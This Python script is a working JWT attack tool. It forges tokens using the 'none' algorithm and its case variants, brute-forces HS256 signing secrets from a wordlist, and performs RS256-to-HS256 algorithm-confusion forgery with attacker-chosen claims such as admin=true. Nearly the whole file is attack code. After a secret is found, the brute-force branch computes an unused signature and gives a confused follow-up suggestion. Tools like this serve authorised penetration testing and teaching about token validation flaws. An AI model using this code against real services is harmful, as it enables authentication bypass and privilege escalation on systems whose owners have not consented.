#!/usr/bin/env python3
"""
JWT attacker: none-algorithm bypass, HS256 secret brute-force, algorithm confusion (RS256->HS256).
"""

import argparse
import base64
import hashlib
import hmac
import json
import sys
from pathlib import Path


def b64url_decode(s: str) -> bytes:
    s += '=' * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()


def parse_jwt(token: str) -> tuple[dict, dict, str]:
    parts = token.split('.')
    if len(parts) != 3:
        print("[!] Invalid JWT: expected 3 parts")
        sys.exit(1)
    header  = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    return header, payload, parts[2]


def build_jwt(header: dict, payload: dict, signature: bytes = b'') -> str:
    h = b64url_encode(json.dumps(header, separators=(',', ':')).encode())
    p = b64url_encode(json.dumps(payload, separators=(',', ':')).encode())
    s = b64url_encode(signature)
    return f"{h}.{p}.{s}"


# ── None algorithm ────────────────────────────────────────────────────────────

def attack_none(token: str, set_claims: list[str]) -> str:
    header, payload, _ = parse_jwt(token)
    print(f"[*] Original header:  {header}")
    print(f"[*] Original payload: {payload}")

    for claim in set_claims:
        k, v = claim.split('=', 1)
        try:
            v = json.loads(v)
        except Exception:
            pass
        payload[k] = v
        print(f"[*] Set claim: {k} = {v!r}")

    header['alg'] = 'none'
    # Also try 'None', 'NONE', 'NoNe' - some implementations check case-insensitively
    forged = build_jwt(header, payload)
    print(f"\n[+] Forged token (alg=none): {forged}")
    for alg_variant in ('None', 'NONE', 'NoNe'):
        h2 = dict(header)
        h2['alg'] = alg_variant
        print(f"[+] Variant ({alg_variant}): {build_jwt(h2, payload)}")
    return forged


# ── HS256 brute force ─────────────────────────────────────────────────────────

def _hs256_sign(header_payload: str, secret: bytes) -> bytes:
    return hmac.new(secret, header_payload.encode(), hashlib.sha256).digest()


def attack_bruteforce(token: str, wordlist_path: str) -> str | None:
    parts = token.split('.')
    header_payload = f"{parts[0]}.{parts[1]}"
    sig = b64url_decode(parts[2])

    wl = Path(wordlist_path)
    if not wl.exists():
        print(f"[!] Wordlist not found: {wl}")
        sys.exit(1)

    print(f"[*] Brute-forcing HS256 secret ...")
    with open(wl, errors='ignore') as f:
        for i, line in enumerate(f):
            secret = line.rstrip('\n\r').encode()
            candidate = _hs256_sign(header_payload, secret)
            if hmac.compare_digest(candidate, sig):
                print(f"[+] Secret found: {secret!r}")
                return secret.decode()
            if i % 100_000 == 0:
                print(f"\r[*] {i:,} tried ...", end='', flush=True)
    print()
    print("[-] Secret not found in wordlist")
    return None


# ── Algorithm confusion (RS256 -> HS256) ─────────────────────────────────────

def attack_confusion(token: str, pubkey_path: str, set_claims: list[str]) -> str:
    header, payload, _ = parse_jwt(token)
    print(f"[*] Original header:  {header}")
    print(f"[*] Original payload: {payload}")

    pubkey = Path(pubkey_path).read_bytes()

    for claim in set_claims:
        k, v = claim.split('=', 1)
        try:
            v = json.loads(v)
        except Exception:
            pass
        payload[k] = v

    new_header = dict(header)
    new_header['alg'] = 'HS256'

    h = b64url_encode(json.dumps(new_header, separators=(',', ':')).encode())
    p = b64url_encode(json.dumps(payload, separators=(',', ':')).encode())
    header_payload = f"{h}.{p}"

    sig = hmac.new(pubkey, header_payload.encode(), hashlib.sha256).digest()
    forged = f"{header_payload}.{b64url_encode(sig)}"
    print(f"\n[+] Forged token (alg confusion RS256->HS256): {forged}")
    return forged


# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="JWT attacker: none algorithm, HS256 brute-force, key confusion")
    parser.add_argument("--token", required=True, help="JWT token to attack")
    parser.add_argument("--mode", required=True,
                        choices=["none", "bruteforce", "confusion"],
                        help="Attack mode")
    parser.add_argument("--wordlist", help="Wordlist for brute-force mode")
    parser.add_argument("--pubkey", help="Path to RSA public key PEM (for confusion mode)")
    parser.add_argument("--set-claim", action="append", default=[], dest="claims",
                        metavar="KEY=VALUE",
                        help="Set a JWT claim (e.g. --set-claim admin=true). Can be repeated.")
    parser.add_argument("--decode", action="store_true", help="Only decode and print the token")
    args = parser.parse_args()

    if args.decode:
        header, payload, sig = parse_jwt(args.token)
        print(f"Header:  {json.dumps(header, indent=2)}")
        print(f"Payload: {json.dumps(payload, indent=2)}")
        print(f"Sig:     {sig}")
        return

    if args.mode == "none":
        attack_none(args.token, args.claims)
    elif args.mode == "bruteforce":
        if not args.wordlist:
            print("[!] --mode bruteforce requires --wordlist")
            sys.exit(1)
        secret = attack_bruteforce(args.token, args.wordlist)
        if secret:
            header, payload, _ = parse_jwt(args.token)
            parts = args.token.split('.')
            sig = _hs256_sign(f"{parts[0]}.{parts[1]}", secret.encode())
            print(f"[+] Resign with new claims using: python jwt_attacker.py --token {args.token} --mode none")
    elif args.mode == "confusion":
        if not args.pubkey:
            print("[!] --mode confusion requires --pubkey")
            sys.exit(1)
        attack_confusion(args.token, args.pubkey, args.claims)


if __name__ == "__main__":
    main()
